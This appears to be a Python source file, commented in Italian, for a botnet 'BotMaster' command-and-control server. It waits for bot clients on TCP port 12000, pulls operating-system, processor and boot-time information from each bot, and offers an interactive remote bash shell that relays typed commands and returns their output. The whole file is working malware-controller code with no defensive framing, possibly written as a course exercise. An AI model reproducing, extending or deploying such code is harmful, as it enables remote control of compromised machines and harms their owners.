from socket import *
serverPort = 12000
 #Dimensione del buffer, in questo caso il messaggio ricevuto puo essere al piu 4kb ma possiamo ovviamente aumentare nel caso
BUFFER_SIZE = 1024 * 4
serverSocket = socket(AF_INET,SOCK_STREAM)
serverName = gethostbyname(gethostname())
serverSocket.bind(('',serverPort))
serverSocket.listen(1)
print('Il BotMaster con indirizzo IP:',serverName, 'e\' pronto a ricevere le informazioni dalla Botnet client...')

def invia_messaggio(messaggio):
    global connectionSocket
    try:
        connectionSocket.send(messaggio.encode())
    except Exception as e:
        #Il client si e' disconnesso nel mentre, tentiamo la riconnessione a un bot
        print (str(e.errno))
        print(str(e))
        connectionSocket.close()
        connectionSocket, addr = serverSocket.accept()
        print ("Messaggio non inviato, bot master connesso ad un bot con indirizzo" + str(addr))


def ricevi_stampa_messaggio():
    global connectionSocket
    print(str(ricevi_messaggio()))
        
def ricevi_messaggio():
    global connectionSocket
    try:
        messaggio = connectionSocket.recv(BUFFER_SIZE).decode()
        return str(messaggio)
    except Exception as e:
        #Il client si e' disconnesso nel mentre, tentiamo la riconnessione a un bot
        print (str(e.errno))
        print(str(e))
        connectionSocket.close()
        connectionSocket, addr = serverSocket.accept()
        print ("Messaggio non ricevuto, bot master connesso ad un bot con indirizzo" + str(addr))
        
def menu():
    print("\nScegliere l'operazione da eseguire:\n"
          +"0: termina la connessione\n"
          +"1: ricevi informazioni sul sistema operativo\n"
          +"2: ricevi informazioni sul processore\n"
          +"3: ricevi informazioni sul tempo d'avvio\n"
          +"4: entra in controllo della bash\n")
    return input()
    
while True:
    connectionSocket, addr = serverSocket.accept()
    print('\nNuova Botnet client connessa al BotMaster', addr)
    cwd = ricevi_messaggio()
    
    while True:
        comando = menu()
        if comando == '4':
            cmd = ''
            while cmd.lower() != "exit": #Finche non scegliamo di uscire dalla bash
                cmd = input(f"{cwd}$>") #stampiamo la cwd, prendiamo il comando da eseguire e lo mandiamo
                if cmd.lower() != "exit":
                    invia_messaggio(f"4<sep>{cmd}")
                    output = ricevi_messaggio()
                    queryRes, cwd = output.split('<sep>')
                    print(queryRes + "\n")
        else:
            invia_messaggio(comando)
            if (comando != "0"):
                ricevi_stampa_messaggio()
            else:
                break

    connectionSocket.close()
    print("Precedente connessione terminata, BotMaster in attesa di un nuovo bot")

